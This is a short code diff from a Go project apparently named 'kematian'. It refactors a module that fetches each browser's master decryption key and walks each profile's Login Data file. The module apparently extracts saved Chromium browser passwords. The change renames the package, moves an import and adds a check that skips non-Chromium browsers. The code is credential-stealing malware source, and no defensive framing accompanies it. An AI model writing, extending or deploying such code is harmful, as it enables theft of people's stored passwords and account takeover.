@@ -1,9 +1,9 @@
-package pass
+package passChromium
 
 import (
 	"database/sql"
 	"encoding/json"
-	"kdot/kematian/browsers/chromium/structs"
+	"kdot/kematian/browsers/structs"
 	"kdot/kematian/decryption"
 )
 
@@ -17,6 +17,9 @@ func Get(browsersList []structs.Browser) string {
 	var passwords []Passwords
 
 	for _, browser := range browsersList {
+		if !browser.IsChromium {
+			continue
+		}
 		master_key := decryption.GetMasterKey(browser.LocalState)
 		for _, profile := range browser.Profiles {
 			path := profile.LoginData
